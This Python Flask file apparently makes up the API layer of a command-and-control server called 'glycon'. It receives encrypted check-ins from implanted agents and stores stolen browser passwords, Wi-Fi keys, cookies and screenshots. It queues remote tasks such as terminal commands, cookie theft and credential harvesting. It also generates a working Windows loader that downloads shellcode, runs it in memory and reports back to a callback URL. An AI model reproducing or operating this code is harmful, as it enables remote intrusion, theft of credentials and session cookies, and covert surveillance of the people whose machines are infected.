import os
import sqlite3
from flask import jsonify, request, Response, send_from_directory
from flask_login import login_required
from flask_login import current_user
from datetime import datetime
import json
import base64
import traceback
import tempfile
import subprocess
import uuid
from werkzeug.security import generate_password_hash
from glycon.secure_comms import SecureComms
from glycon.config import CONFIG
import traceback  # For detailed error reporting

def _generate_runner_script(shellcode_url, callback_url=None):
    """Generate the Python runner script that will download and execute shellcode and optionally send output back"""
    callback_code = ""
    if callback_url:
        callback_code = f'''
import json
import requests
def send_status(url, data):
    try:
        headers = {{'Content-Type': 'application/json'}}
        requests.post(url, data=json.dumps(data), headers=headers, verify=False, timeout=5)
    except Exception:
        pass
'''
    return f"""import ctypes as mill
import sys, requests as r
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
{callback_code}
def mi(little):   
    try:
        bmx = r.get(little, verify=False).content
    except r.exceptions.RequestException as e:
        print(f"Error downloading file: {{e}}")
        if '{callback_url}':
            send_status('{callback_url}', {{'status': 'error', 'message': str(e)}})
        return

    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
    mill.windll.kernel32.CreateThread.argtypes = (
        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))

    spc = mill.windll.kernel32.VirtualAlloc(
        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
    hndl = mill.windll.kernel32.CreateThread(
        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
        mill.pointer(mill.c_int(0)))

    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
    if '{callback_url}':
        send_status('{callback_url}', {{'status': 'success', 'message': 'Shellcode executed'}})

if __name__ == "__main__":
    little = "{shellcode_url}"
    mi(little)"""


def init_api_routes(app, socketio):
    @app.route('/api/shellcode_output', methods=['POST'])
    def shellcode_output():
        try:
            if not request.is_json:
                return jsonify({"status": "error", "message": "JSON data required"}), 400
            
            data = request.get_json()
            agent_id = data.get('agent_id')
            status = data.get('status')
            message = data.get('message')
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')
            
            if not agent_id or not status:
                return jsonify({"status": "error", "message": "agent_id and status required"}), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Ensure the shellcode_outputs table exists
            c.execute('''
                CREATE TABLE IF NOT EXISTS shellcode_outputs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    agent_id TEXT NOT NULL,
                    status TEXT NOT NULL,
                    message TEXT,
                    timestamp TEXT NOT NULL
                )
            ''')
            
            c.execute('''INSERT INTO shellcode_outputs (agent_id, status, message, timestamp)
                         VALUES (?, ?, ?, ?)''',
                      (agent_id, status, message, timestamp))
            
            conn.commit()
            conn.close()
            
            # Notify clients via websocket
            socketio.emit('shellcode_output', {
                'agent_id': agent_id,
                'status': status,
                'message': message,
                'timestamp': timestamp
            })
            
            return jsonify({"status": "success"})
        except Exception as e:
            app.logger.error(f"Error processing shellcode output: {str(e)}")
            return jsonify({"status": "error", "message": str(e)}), 500

    @app.route('/api/checkin', methods=['POST'])
    def agent_checkin():
        conn = None
        try:
            if not request.data:
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            try:
                data = SecureComms.decrypt(request.data)
                app.logger.debug(f"Received checkin from agent: {data['agent_id']}")
            except Exception as e:
                app.logger.error(f"Decryption error: {str(e)}")
                return Response(SecureComms.encrypt({'type': 'noop'}),
                              mimetype='application/octet-stream')

            conn = sqlite3.connect(CONFIG.database)
            conn.execute("PRAGMA journal_mode=WAL")
            c = conn.cursor()

            c.execute("SELECT ws_connected FROM agents WHERE id=?", (data['agent_id'],))
            agent = c.fetchone()
            current_ws_status = agent[0] if agent else 0

            c.execute('''INSERT OR REPLACE INTO agents 
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                    (data['agent_id'],
                    data.get('hostname', 'UNKNOWN'),
                    data.get('ip', '0.0.0.0'),
                    data.get('os', 'UNKNOWN'),
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                    'online',
                    data.get('privilege', 'user'),
                    current_ws_status,
                    data.get('killdate'),  # New killdate field
                    data.get('checkin_interval', 10)  # New checkin_interval field
            ))

            if 'credentials' in data:
                creds = data['credentials']
                for cred in creds.get('browsers', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  cred.get('browser', 'unknown'),
                                  cred.get('url', ''),
                                  cred.get('username', ''),
                                  cred.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing credential: {str(e)}")
                        continue

                for wifi in creds.get('wifi', []):
                    try:
                        c.execute('''INSERT OR IGNORE INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                 (None, data['agent_id'],
                                  'wifi',
                                  '',
                                  wifi.get('ssid', ''),
                                  wifi.get('password', ''),
                                  datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing wifi: {str(e)}")
                        continue

            if 'screenshot' in data:
                try:
                    if isinstance(data['screenshot'], str):
                        image_data = base64.b64decode(data['screenshot'])
                    else:
                        image_data = data['screenshot']
                    
                    if len(image_data) > 10 * 1024 * 1024:
                        raise ValueError("Screenshot too large")
                    
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                             (None, data['agent_id'],
                              image_data,
                              datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            c.execute('''SELECT id, task_type, task_data FROM tasks 
                         WHERE agent_id=? AND status='pending'
                         ORDER BY created_at LIMIT 1''',
                     (data['agent_id'],))
            task = c.fetchone()

            if task:
                c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
                response = {
                    'task_id': task[0],
                    'type': task[1],
                    'data': json.loads(task[2])
                }
            else:
                response = {'type': 'noop'}

            conn.commit()
            conn.close()

            encrypted_response = SecureComms.encrypt(response)
            return Response(encrypted_response,
                          mimetype='application/octet-stream')

        except Exception as e:
            app.logger.error(f"Checkin error: {str(e)}")
            if conn:
                conn.rollback()
                conn.close()
            return Response(SecureComms.encrypt({'type': 'noop'}),
                          mimetype='application/octet-stream')

    @app.route('/api/screenshots/<int:screenshot_id>', methods=['DELETE'])
    @login_required
    def delete_screenshot(screenshot_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("SELECT id, agent_id FROM screenshots WHERE id = ?", (screenshot_id,))
            screenshot = c.fetchone()
            
            if not screenshot:
                return jsonify({"status": "error", "message": "Screenshot not found"}), 404
                
            c.execute("DELETE FROM screenshots WHERE id = ?", (screenshot_id,))
            
            conn.commit()
            
            socketio.emit('screenshot_deleted', {
                'screenshot_id': screenshot_id,
                'agent_id': screenshot[1]
            })
            
            return jsonify({"status": "success"}), 200
            
        except Exception as e:
            app.logger.error(f"Error deleting screenshot: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/agents/<string:agent_id>', methods=['DELETE'])
    @login_required
    def delete_agent(agent_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # First check if agent exists
            c.execute("SELECT id FROM agents WHERE id=?", (agent_id,))
            if not c.fetchone():
                return jsonify({"status": "error", "message": "Agent not found"}), 404
                
            # Delete related data first to maintain referential integrity
            c.execute("DELETE FROM tasks WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM screenshots WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM credentials WHERE agent_id=?", (agent_id,))
            c.execute("DELETE FROM stolen_data WHERE agent_id=?", (agent_id,))
            
            # Now delete the agent
            c.execute("DELETE FROM agents WHERE id=?", (agent_id,))
            
            conn.commit()
            
            # Notify clients via websocket
            socketio.emit('agent_deleted', {
                'agent_id': agent_id,
                'message': f'Agent {agent_id} was deleted'
            })
            
            return jsonify({
                "status": "success",
                "message": f"Agent {agent_id} and all related data deleted"
            })
            
        except Exception as e:
            app.logger.error(f"Error deleting agent {agent_id}: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()



    @app.route('/api/task', methods=['POST'])
    @login_required
    def create_task():
        try:
            if request.content_type != 'application/json':
                return jsonify({
                    "status": "error", 
                    "message": "Content-Type must be application/json"
                }), 415

            data = request.get_json()
            if not data:
                return jsonify({
                    "status": "error", 
                    "message": "No JSON data provided"
                }), 400
            
            required_fields = ['agent_id', 'task_type']
            if not all(field in data for field in required_fields):
                return jsonify({
                    "status": "error", 
                    "message": f"Missing required fields: {required_fields}"
                }), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            task_data = data.get('task_data', {})
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, 
                    data['agent_id'], 
                    data['task_type'], 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            
            if data['task_type'] == 'websocket':
                ws_connected = 1 if data.get('action') == 'start' else 0
                c.execute("UPDATE agents SET ws_connected=? WHERE id=?",
                        (ws_connected, data['agent_id']))
                conn.commit()
            
            conn.close()
            
            socketio.emit('new_task', {
                'task_id': task_id,
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({
                "status": "success", 
                "task_id": task_id
            })

        except Exception as e:
            app.logger.error(f"Error creating task: {str(e)}")
            return jsonify({
                "status": "error", 
                "message": str(e)
            }), 500


    @app.route('/api/task_result', methods=['POST'])
    def task_result():
        conn = None
        try:
            # Decrypt and validate incoming data
            if not request.data:
                return jsonify({'status': 'error', 'message': 'No data provided'}), 400
                
            data = SecureComms.decrypt(request.data)
            if not data or 'task_id' not in data or 'agent_id' not in data:
                return jsonify({'status': 'error', 'message': 'Invalid task result format'}), 400
                
            app.logger.info(f"Processing task result for task ID: {data['task_id']}")

            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Update task status
            c.execute('''UPDATE tasks SET status='completed', completed_at=?
                        WHERE id=?''', 
                    (datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') , data['task_id']))
            
            # Handle different task types
            if data['task_type'] == 'steal_cookies' and 'result' in data and 'results' in data['result']:
                app.logger.info(f"Processing cookie data from {len(data['result']['results'])} browsers")
                
                for result in data['result']['results']:
                    try:
                        # Validate required fields
                        if 'browser' not in result:
                            app.logger.error("Missing browser field in cookie result")
                            continue
                            
                        if 'zip_content' not in result:
                            app.logger.error(f"Missing zip_content in {result['browser']} cookie result")
                            continue
                            
                        # Decode and validate cookie data
                        try:
                            cookie_data = base64.b64decode(result['zip_content'])
                            if not cookie_data:
                                app.logger.error(f"Empty cookie data for {result['browser']}")
                                continue
                                
                            # Verify the data is valid JSON
                            try:
                                json.loads(cookie_data.decode('utf-8'))
                            except ValueError:
                                app.logger.error(f"Invalid JSON in {result['browser']} cookie data")
                                continue
                                
                        except Exception as e:
                            app.logger.error(f"Failed to decode {result['browser']} cookie data: {str(e)}")
                            continue
                        
                        # Store in database
                        c.execute('''INSERT INTO stolen_data 
                                    (agent_id, browser, data_type, content, system_info, timestamp)
                                    VALUES (?, ?, ?, ?, ?, ?)''',
                                (data['agent_id'],
                                result['browser'],
                                'cookies',
                                sqlite3.Binary(cookie_data),
                                json.dumps(result.get('system_info', {})),
                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                        
                        app.logger.info(f"Successfully stored {result['browser']} cookies")
                        
                    except Exception as e:
                        app.logger.error(f"Failed to process {result.get('browser', 'unknown')} cookies: {str(e)}")
                        continue
            
            # Handle websocket status updates
            if data['task_type'] == 'websocket':
                ws_connected = 1 if (data['result'].get('status') == 'success' and 
                                'connected' in data['result'].get('message', '').lower()) else 0
                c.execute('''UPDATE agents SET ws_connected=? WHERE id=?''',
                        (ws_connected, data['agent_id']))
                
                socketio.emit('ws_status', {
                    'agent_id': data['agent_id'],
                    'action': data['result'].get('action', ''),
                    'status': 'success' if ws_connected else 'error',
                    'message': data['result'].get('message', '')
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            # Handle terminal output
            if data['task_type'] == 'terminal' and data['result'].get('terminal', False):
                socketio.emit('terminal_output', {
                    'agent_id': data['agent_id'],
                    'command': data['result'].get('command', ''),
                    'output': data['result'].get('output', ''),
                    'error': data['result'].get('error', ''),
                    'current_dir': data['result'].get('current_dir', ''),
                    'task_id': data['task_id']
                }, room=f"terminal_{data['agent_id']}", namespace='/terminal')

            # Handle screenshots
            if data['task_type'] == 'screenshot' and 'screenshot' in data['result']:
                try:
                    image_data = base64.b64decode(data['result']['screenshot'])
                    c.execute('''INSERT INTO screenshots 
                                VALUES (?, ?, ?, ?)''',
                            (None, data['agent_id'], 
                            image_data,
                            datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                except Exception as e:
                    app.logger.error(f"Error storing screenshot: {str(e)}")

            # Handle credential harvesting
            if data['task_type'] == 'harvest_creds' and 'credentials' in data['result']:
                for cred in data['result']['credentials']:
                    try:
                        c.execute('''INSERT INTO credentials 
                                    VALUES (?, ?, ?, ?, ?, ?, ?)''',
                                (None, data['agent_id'],
                                cred.get('browser', ''),
                                cred.get('url', ''),
                                cred.get('username', ''),
                                cred.get('password', ''),
                                datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z') ))
                    except Exception as e:
                        app.logger.error(f"Error storing credential: {str(e)}")
                        pass
            
            conn.commit()
            
            # Notify clients of task completion
            socketio.emit('task_complete', {
                'task_id': data['task_id'],
                'agent_id': data['agent_id'],
                'task_type': data['task_type']
            })
            
            return jsonify({'status': 'success'})
            
        except Exception as e:
            app.logger.error(f"Task result processing error: {str(e)}")
            if conn:
                try:
                    conn.rollback()
                except:
                    pass
            return jsonify({'status': 'error', 'message': str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/download_stolen_data/<int:data_id>')
    @login_required
    def download_stolen_data(data_id):
        conn = sqlite3.connect(CONFIG.database)
        c = conn.cursor()
        
        c.execute("SELECT browser, content FROM stolen_data WHERE id=?", (data_id,))
        data = c.fetchone()
        conn.close()
        
        if not data:
            return jsonify({"status": "error", "message": "Data not found"}), 404
        
        browser, content = data
        return Response(
            content,
            mimetype='application/json',
            headers={
                'Content-Disposition': f'attachment; filename={browser}_cookies.json'
            }
        )

    @app.route('/api/generate_agent', methods=['POST'])
    @login_required
    def generate_agent():
        try:
            data = request.get_json()
            if not data:
                return jsonify({"status": "error", "message": "No data provided"}), 400

            agents_dir = os.path.join(app.root_path, 'agents')
            os.makedirs(agents_dir, exist_ok=True)

            # Process kill date if enabled
            killdate_enabled = bool(data.get('enable_killdate', False))
            killdate_value = ""
            if killdate_enabled and data.get('killdate'):
                try:
                    # Convert from ISO format (YYYY-MM-DDTHH:MM) to our desired format (YYYY-MM-DD HH:MM)
                    dt = datetime.strptime(data['killdate'], "%Y-%m-%dT%H:%M")
                    killdate_value = dt.strftime("%Y-%m-%d %H:%M")
                except ValueError as e:
                    app.logger.warning(f"Invalid kill date format: {str(e)}")
                    killdate_enabled = False

            config = {
                'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
                'server_url': data.get('server_url', request.url_root).strip('/'),
                'take_screenshots': bool(data.get('take_screenshots', True)),
                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
                'killdate_enabled': killdate_enabled,
                'killdate': killdate_value if killdate_enabled else "",
                'trusted_certificate': bool(data.get('trusted_certificate', False))
            }

            # Save agent configuration to database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute('''INSERT INTO agent_configurations 
                         (checkin_interval, server_url, take_screenshots, screenshot_frequency, killdate_enabled, killdate, trusted_certificate, timestamp)
                         VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                      (config['checkin_interval'],
                       config['server_url'],
                       int(config['take_screenshots']),
                       config['screenshot_frequency'],
                       int(config['killdate_enabled']),
                       config['killdate'],
                       int(config['trusted_certificate']),
                       datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z')))
            conn.commit()
            conn.close()

            template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
            if not os.path.exists(template_path):
                return jsonify({"status": "error", "message": "Agent template not found"}), 500

            with open(template_path, 'r') as f:
                template = f.read()

            agent_code = template.format(
                checkin_interval=config['checkin_interval'],
                server_url=config['server_url'],
                take_screenshots=str(config['take_screenshots']),
                screenshot_frequency=config['screenshot_frequency'],
                killdate_enabled=str(config['killdate_enabled']),
                killdate=config['killdate'] if config['killdate_enabled'] else ""
            )

            agent_path = os.path.join(agents_dir, 'agent.py')
            with open(agent_path, 'w') as f:
                f.write(agent_code)

            return jsonify({
                "status": "success",
                "message": "Agent configuration saved",
                "config": config
            })

        except Exception as e:
            app.logger.error(f"Error generating agent: {str(e)}")
            return jsonify({
                "status": "error",
                "message": f"Internal server error: {str(e)}"
            }), 500

    @app.route('/a/d')
    #@login_required
    def download_agent():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'agent.py')):
            return jsonify({"status": "error", "message": "Agent file not found"}), 404
        return send_from_directory(agents_dir, 'agent.py', as_attachment=True)
    
    @app.route('/a/p')
    #@login_required
    def download_python():
        agents_dir = os.path.join(app.root_path, 'agents')
        if not os.path.exists(os.path.join(agents_dir, 'p.zip')):
            return jsonify({"status": "error", "message": "p not found"}), 404
        return send_from_directory(agents_dir, 'p.zip', as_attachment=True)

    @app.route('/api/stolen_data/<int:data_id>', methods=['DELETE'])
    @login_required
    def delete_stolen_data(data_id):
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("DELETE FROM stolen_data WHERE id=?", (data_id,))
            conn.commit()
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/killdate_reached', methods=['POST'])
    def killdate_reached():
        conn = None
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            if not data or 'agent_id' not in data:
                return jsonify({"status": "error", "message": "Invalid data format"}), 400
                
            app.logger.info(f"Killdate reached for agent {data['agent_id']}")
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Mark agent as dead in database
            c.execute('''UPDATE agents SET status='dead' WHERE id=?''',
                    (data['agent_id'],))
            
            conn.commit()
            
            # Notify clients
            socketio.emit('agent_dead', {
                'agent_id': data['agent_id'],
                'message': 'Killdate reached - agent self-destructed',
                'timestamp': data.get('timestamp', '')
            })
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            app.logger.error(f"Error processing killdate: {str(e)}")
            if conn:
                conn.rollback()
            return jsonify({"status": "error", "message": str(e)}), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/shellcode', methods=['POST'])
    @login_required
    def generate_shellcode():
        try:
            entropy = request.form.get('entropy', '1')
            arch = request.form.get('arch', '64')
            args = request.form.get('args', '')
            agent_id = request.form.get('agent_id')
            shellcode_type = request.form.get('shellcodeType', 'file')
            raw_input_method = request.form.get('rawInputMethod', 'file')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
                
            # Create temp directory
            temp_dir = tempfile.mkdtemp()
            shellcode = None
            
            if shellcode_type == 'file':
                if 'file' not in request.files:
                    return jsonify({"status": "error", "message": "No file provided"}), 400
                    
                file = request.files['file']
                if file.filename == '':
                    return jsonify({"status": "error", "message": "No file selected"}), 400
                
                if not file.filename.lower().endswith(('.exe', '.dll')):
                    raise Exception("Only EXE and DLL files are supported for shellcode generation")
                
                input_path = os.path.join(temp_dir, file.filename)
                file.save(input_path)
                
                # Generate unique output name
                random_value = str(uuid.uuid4())[:8]
                output_name = f"{os.path.splitext(file.filename)[0]}-{agent_id}-{random_value}"
                output_path = os.path.join(temp_dir, output_name + '.bin')
                
                # Build donut command
                args_str = str(args) if args else ''
                
                cmd = [
                    'docker', 'run', '--rm',
                    '-v', f"{temp_dir}:/workdir",
                    'donut',
                    '-e', str(entropy),
                    '-a', str(arch),
                    '-o', f"/workdir/{output_name}.bin",
                    '-f', '1',
                    '-p', f'"{args_str}"',
                    '-i', f"/workdir/{file.filename}"
                ]

                # Run donut and properly handle the response
                try:
                    result = subprocess.run(cmd, capture_output=True, text=True, check=True)
                    if result.returncode != 0:
                        raise Exception(f"Donut failed: {result.stderr}")
                    
                    if not os.path.exists(output_path):
                        raise Exception("Shellcode file was not generated")
                    
                    with open(output_path, 'rb') as f:
                        shellcode = f.read()
                except subprocess.CalledProcessError as e:
                    raise Exception(f"Donut execution failed: {e.stderr}")
            else:
                # Handle raw shellcode input
                if raw_input_method == 'file':
                    if 'file' not in request.files:
                        return jsonify({"status": "error", "message": "No file provided"}), 400
                        
                    file = request.files['file']
                    if file.filename == '':
                        return jsonify({"status": "error", "message": "No file selected"}), 400
                    
                    input_path = os.path.join(temp_dir, file.filename)
                    file.save(input_path)
                    with open(input_path, 'rb') as f:
                        shellcode = f.read()
                else:
                    hex_string = request.form.get('shellcodeHex', '').strip()
                    if not hex_string:
                        raise Exception("No hex shellcode provided")
                    try:
                        shellcode = bytes.fromhex(hex_string)
                    except ValueError as e:
                        raise Exception(f"Invalid hex string: {str(e)}")
            
            if not shellcode:
                raise Exception("No shellcode was generated or provided")
            
            # Generate random filename for shellcode
            shellcode_name = f"shellcode_{uuid.uuid4().hex[:8]}.bin"
            shellcode_dir = os.path.join(app.root_path, 'shellcodes')
            os.makedirs(shellcode_dir, exist_ok=True)
            shellcode_path = os.path.join(shellcode_dir, shellcode_name)
            
            # Save shellcode to file
            with open(shellcode_path, 'wb') as f:
                f.write(shellcode)
            
            # Generate shellcode URL
            shellcode_url = f"{request.url_root}api/download_shellcode/{shellcode_name}"
            
            # Generate runner script
            runner_content = _generate_runner_script(shellcode_url)
            runner_name = f"runner_{uuid.uuid4().hex[:8]}.py"
            runners_dir = os.path.join(app.root_path, 'runners')
            os.makedirs(runners_dir, exist_ok=True)
            runner_path = os.path.join(runners_dir, runner_name)
            
            with open(runner_path, 'w') as f:
                f.write(runner_content)
                
            runner_url = f"{request.url_root}api/download_runner/{runner_name}"
            
            # Create task for agent
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # First check if identical task already exists
            c.execute("""SELECT id FROM tasks 
                        WHERE agent_id=? AND task_type='shellcode' AND status='pending'
                        ORDER BY created_at DESC LIMIT 1""",
                    (agent_id,))
            existing_task = c.fetchone()
            
            if existing_task:
                return jsonify({
                    "status": "error",
                    "message": "A pending shellcode task already exists for this agent"
                }), 400

            task_data = {
                'runner_url': runner_url,
                'execution_method': 'download_execute'
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, agent_id, 'shellcode', 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            conn.close()
            
            # Clean up temp files
            try:
                if 'input_path' in locals() and os.path.exists(input_path):
                    os.remove(input_path)
                if 'output_path' in locals() and os.path.exists(output_path):
                    os.remove(output_path)
                if os.path.exists(temp_dir):
                    os.rmdir(temp_dir)
            except Exception as e:
                app.logger.error(f"Error cleaning up temp files: {str(e)}")
            
        
            
            return jsonify({
                "status": "success",
                "task_id": task_id,
                "message": "Shellcode generated and task created",
                "runner_url": runner_url
            })
            
        except Exception as e:
            # Clean up temp files if they exist
            try:
                if 'input_path' in locals() and os.path.exists(input_path):
                    os.remove(input_path)
                if 'output_path' in locals() and os.path.exists(output_path):
                    os.remove(output_path)
                if 'temp_dir' in locals() and os.path.exists(temp_dir):
                    os.rmdir(temp_dir)
            except:
                pass
                
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500


    @app.route('/api/kill_agent', methods=['POST'])
    @login_required
    def kill_agent():
        conn = None
        try:
            data = request.get_json()
            if not data or 'agent_id' not in data:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
                
            agent_id = data['agent_id']
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Create a kill task that will force immediate termination
            task_data = {
                'force': True,
                'immediate': True,
                'method': 'kill_process',
                'retries': 3  # Number of times to retry killing
            }
            
            c.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (None, agent_id, 'kill', 
                    json.dumps(task_data),
                    'pending', 
                    datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'), 
                    None))
            
            conn.commit()
            task_id = c.lastrowid
            
            # Don't mark as dead immediately - wait for confirmation
            socketio.emit('agent_kill_initiated', {
                'agent_id': agent_id,
                'task_id': task_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                'message': 'Kill command sent to agent'
            })
            
            return jsonify({
                "status": "success",
                "task_id": task_id,
                "message": f"Kill command sent to agent {agent_id}"
            })
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/agent_terminated', methods=['POST'])
    def agent_terminated():
        conn = None
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            agent_id = data.get('agent_id')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
            
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Confirm agent termination
            c.execute("UPDATE agents SET status='dead', last_seen=? WHERE id=?",
                    (data.get('timestamp'), agent_id))
            
            conn.commit()
            
            # Notify clients
            socketio.emit('agent_terminated', {
                'agent_id': agent_id,
                'timestamp': data.get('timestamp'),
                'message': 'Agent confirmed terminated'
            })
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            if conn:
                conn.rollback()
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if conn:
                conn.close()

    @app.route('/api/verify_termination', methods=['POST'])
    def verify_termination():
        try:
            if not request.data:
                return jsonify({"status": "error", "message": "No data provided"}), 400
                
            data = SecureComms.decrypt(request.data)
            agent_id = data.get('agent_id')
            
            if not agent_id:
                return jsonify({"status": "error", "message": "Agent ID required"}), 400
            
            # Try to ping the agent
            try:
                response = requests.post(
                    f"https://{data.get('last_known_ip')}/api/ping",
                    timeout=5,
                    verify=False
                )
                if response.status_code == 200:
                    return jsonify({
                        "status": "error",
                        "message": "Agent still responding",
                        "alive": True
                    })
            except:
                pass
            
            # If we get here, agent appears dead
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            c.execute("UPDATE agents SET status='dead' WHERE id=?", (agent_id,))
            conn.commit()
            
            socketio.emit('agent_confirmed_dead', {
                'agent_id': agent_id,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S %Z'),
                'message': 'Agent termination confirmed'
            })
            
            return jsonify({
                "status": "success",
                "alive": False,
                "message": "Agent termination confirmed"
            })
            
        except Exception as e:
            return jsonify({
                "status": "error",
                "message": str(e)
            }), 500
        finally:
            if 'conn' in locals():
                conn.close()

    @app.route('/api/check_agent_status', methods=['POST'])
    def check_agent_status():
        # First verify the monitor token
        auth_header = request.headers.get('Authorization')
        if auth_header and auth_header.startswith('Bearer '):
            token = auth_header.split(' ')[1]
            if token == CONFIG.monitor_token:
                # Bypass authentication for monitor
                pass
            else:
                return jsonify({"status": "error", "message": "Invalid token"}), 401
        else:
            # Apply login_required for non-monitor requests
            if not current_user.is_authenticated:
                return jsonify({"status": "error", "message": "Authentication required"}), 401
        
        conn = None
        try:
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            
            # Get current time
            now = datetime.now()
            
            # Get all agents that haven't checked in within 10x their checkin interval
            c.execute('''
                SELECT id, last_seen, checkin_interval 
                FROM agents 
                WHERE status = 'online'
            ''')
            
            agents = c.fetchall()
            inactive_agents = []
            
            for agent in agents:
                agent_id, last_seen_str, checkin_interval = agent
                
                # Clean up the datetime string by stripping whitespace
                last_seen_str = last_seen_str.strip()
                
                try:
                    # Try parsing with timezone first
                    last_seen = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S %Z')
                except ValueError:
                    try:
                        # Fall back to parsing without timezone if that fails
                        last_seen = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S')
                    except ValueError as e:
                        app.logger.error(f"Error parsing last_seen for agent {agent_id}: {str(e)}")
                        continue
                
                time_diff = (now - last_seen).total_seconds()
                
                # Mark as inactive if last seen > 10x checkin interval
                if time_diff > checkin_interval * 10:
                    c.execute('''
                        UPDATE agents 
                        SET status = 'inactive' 
                        WHERE id = ?
                    ''', (agent_id,))
                    inactive_agents.append(agent_id)
            
            conn.commit()
            
            if inactive_agents:
                # Notify clients via websocket
                socketio.emit('agents_inactive', {
                    'agent_ids': inactive_agents,
                    'message': 'Agents marked as inactive due to missed checkins'
                })
            
            return jsonify({
                "status": "success",
                "inactive_agents": inactive_agents
            })
